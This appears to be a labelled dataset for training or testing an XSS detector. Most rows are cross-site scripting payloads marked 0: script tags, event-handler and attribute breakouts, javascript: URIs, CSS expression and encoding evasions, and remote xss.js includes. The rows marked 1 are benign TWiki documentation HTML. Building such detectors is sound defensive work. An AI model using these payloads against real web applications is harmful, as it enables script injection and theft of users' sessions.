 ' onerror=alert(1);'	0
 ' onerror=alert`1`;'	0
 '; alert(1); //	0
 '; alert`1`; //	0
 ';\r\nalert(1);//	0
 ';\r\nalert`1`;//	0
 onerror=alert(1);	0
 onmousemove=alert(1); 	0
--><script>alert(1);</script>	0
--><script>alert`1`;</script>	0
;}alert(1);{&#39;	0
" /><frame src="javascript:alert(1);"></frameset>	0
" onerror=alert(1);"	0
" onerror=alert`1`;"	0
" onmousemove=alert(1); 	0
" onmousemove=alert(1);"	0
" onmousemove=alert`1`; 	0
" onmousemove=alert`1`;"	0
"; alert(1); //	0
"; alert`1`; //	0
";\r\nalert(1);//	0
";\r\nalert`1`;//	0
""" style="background:url(javascript:alert(1))" "	0
<img src=javascript:alert(1)>	0
"<s>"><img src="javascript:alert(1)">	0
"<s>"><script>alert(1)</script>	0
"></iframe><script>alert(1);</script>	0
"></iframe><script>alert`1`;</script>	0
"><frame src="javascript:alert(1)">	0
"><frame src="javascript:alert`1`">	0
"><script>alert(1);</script>	0
"><script>alert`1`;</script>	0
"onclick="alert(1)"	0
"onclick="alert`1`"	0
"onclick="alert(1)" "onFocus="alert(1)"	0
"onclick="alert`1`" "onFocus="alert`1`"	0
"onFocus="alert(1)"	0
"onFocusOut="alert(1)"	0
"onMouseDown="alert(1)"	0
"onMouseEnter="alert(1)"	0
"onMouseEnter="alert(1)" "onMouseDown="alert(1)"	0
"onMouseLeave="alert(1)"	0
"onMouseLeave="alert(1)" "onMouseOut="alert(1)"	0
"onMouseMove="alert(1)"	0
"onMouseMove="alert(1)" "onFocusOut="alert(1)"	0
"onMouseOut="alert(1)"	0
"onMouseUp="alert(1)"	0
"onMouseWheel="alert(1)"	0
"onMouseWheel="alert(1)" "onMouseUp="alert(1)"	0
”＞＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（’ＸＳＳ’）＜／ｓｃｒｉｐｔ＞	0
*/\r\nalert(1);//	0
*/\r\nalert`1`;//	0
\r\nalert(1);//	0
\r\nalert`1`;//	0
<![CDATA["><script>alert(1)</script><!--]]>	0
</textarea><img src=x onerror=alert(1);>	0
</textarea><img src=x onerror=alert`1`;>	0
</textarea><script>alert(1);</script>	0
</textarea><script>alert`1`;</script>	0
<% onmousemove=alert(1)>	0
<% style="xss:expr/* */ession(alert(1))">	0
<% style="xss:expression(alert(1))">	0
<<script>alert(1);<</script>	0
<a onmouseover="alert(1)">XSS</a>	0
<a onmouseover=alert(1)>XSS</a>	0
<b <script>alert(1)</script>0	0
<b>aaaa<script<b></b><alert(1)</script </b>	0
<div style='behavior:url(test.sct)'>a</div>	0
<div style="color:expression(alert(1));">a</div>	0
<div style="left:exp/* */ression(alert(1))">	0
<div style="left:expression(alert(1))">	0
<div/style="width:expression(alert(1))">x</div>	0
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>	0
<iframe src="javascript:alert(1);"></iframe>	0
<iframe src="x" style=width:exp/**/ressi/**/on(alert(1))>	0
<iframe src=# onmouseover="alert(1)"></iframe>	0
<img src="http://www.example.com/>"onerror="alert(1)//<">	0
<img src=x onerror=alert(1);>	0
<img src=x onerror=alert`1`;>	0
<meta http-equiv="Content-Type" content="text/html; charset=UTF-7"/>+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4-	0
<object data="data:text/html,<script>alert(1)</script>"></object>	0
<q/oncopy=alert(1)	0
<q/oncut=alert(1)	0
<s oncopy= alert(1)>a	0
<s oncut= alert(1)>a	0
<s><script>alert(1)</script>	0
<s>><img src="javascript:alert(1)>	0
<script src=http://example.com/xss.js></script>	0
<sCriPt src=http://example.com/xss.js></script>	0
<script>alert(1);</script>	0
<ScrIpt>alert(1);</SCript>	0
<script>alert`1`;</script>	0
<SELECT NAME="" onmouseover=alert(1)></select>	0
><s><img src="javascript:alert(1)>	0
a style=background:url(javascript:alert(1)) 	0
data:text/html,<script>alert(1)</script>	0
javascript:alert(1);	0
javascript:alert(1)//	0
javascript:alert`1`;	0
style=background:url(javascript(1))	0
<title>TWikiDocumentation</title>	1
</head><body bgcolor="#ffffff">	1
<h1><a name="Feb_2">(01 Feb 2003)</a></h1>	1
<script language="JavaScript" type="text/javascript">	1
<!-- TWiki -->	1
<strong><em>Doubleclick</em></strong>	1
<a href="#TWiki">TWiki System Requirements</a>	1
<a href="#Server_Requirements">Server Requirements</a>	1
<strong><em>Note:</em></strong><a href="" target="_top"></a>	1
<strong><em>Related Topics:</em></strong> <a href="http://TWiki.org">TWikiSite</a>	1
<h1><a name="TWiki_System_Requirements"> TWiki System Requirements </a></h1>	1
<em>Server and client requirements for TWiki 01-Feb-2003</em>	1
<h2><a name="Server_Requirements"> Server Requirements </a></h2>	1
<a href="http://www.gnu.org" target="_top">RCS</a>	1
<table border="1" cellspacing="0" cellpadding="1"> <tr><th colspan="3" bgcolor="#99CCCC"></th></tr>	1
<tr><th bgcolor="#99CCCC"> <strong>Resource</strong> </th><th bgcolor="#99CCCC">	1
<tr><td> Perl </td><td colspan="2" align="center"><br />	1
